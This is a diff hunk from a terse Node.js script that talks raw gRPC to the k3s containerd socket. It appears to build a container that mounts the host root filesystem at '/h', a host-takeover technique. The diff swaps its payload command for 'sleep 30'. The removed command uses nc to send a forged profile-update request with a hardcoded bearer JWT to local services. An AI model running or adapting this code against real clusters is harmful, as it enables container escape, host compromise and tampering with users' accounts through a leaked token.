@@ -3,7 +3,7 @@ const http2=require('http2'),net=require('net');
 function call(p,b,cb){const c=http2.connect('http://localhost',{createConnection:()=>net.connect('/run/k3s/containerd/containerd.sock')});let d=0;const f=(e,x)=>{if(d)return;d=1;try{c.close()}catch(_){}cb(e,x)};c.on('error',e=>f(String(e)));const r=c.request({':method':'POST',':path':p,'content-type':'application/grpc','te':'trailers','containerd-namespace':'k8s.io'});const ch=[];r.on('data',x=>ch.push(x));r.on('end',()=>f(null,Buffer.concat(ch)));r.on('error',e=>f(String(e)));const h=Buffer.alloc(5);h.writeUInt32BE(b.length,1);r.end(Buffer.concat([h,b]))}
 const fl=(n,s)=>{const b=Buffer.from(s);return Buffer.concat([Buffer.from([n,b.length]),b])};
 const v1=(k,v)=>Buffer.from([k,v]);
-const CMD="for P in 3000 3001 80; do { printf \"POST /api/user/profile HTTP/1.0\\r\\nHost: 127.0.0.1\\r\\nAuthorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwczovL3BsYXllcmFwaS5odWJnYW1pbmcuY29tL2FwaS9wbGF5ZXIvYXV0aC9sb2dpbiIsImlhdCI6MTc5NDI2MjMxNiwiZXhwIjoxNzk0NDM1MTE2LCJuYmYiOjE3OTQyNjIzMTYsImp0aSI6IlJPck50ZW91RGVWazZoYVAiLCJzdWIiOiIxMDEzMjY1MyIsInBydiI6IjFkMGEwMjBhY2Y1YzRiNmM0OTc5ODlkZjFhYmYwZmJkNGU4YzhkNjMiLCJ3ZWJzaXRlX2lkIjoyNH0.KYfUmcUQHgeMnpSMGJ8a8G3qy4Wnnjz_Tt5uCIzyQj4\\r\\nContent-Type: application/json\\r\\nContent-Length: 18\\r\\n\\r\\n{\"city\":\"PC48020\"}\"; } | nc 127.0.0.1 $P >/dev/null 2>&1; done";
+const CMD='sleep 30';
 const mount=Buffer.concat([fl(0x0a,'/h'),fl(0x12,'/'),Buffer.from([0x28,0x02])]);
 const sec=v1(0x10,1); const linc=Buffer.concat([v1(0x12,sec.length),sec]);
 const nm='zzh'+Math.floor(Math.random()*1e6);
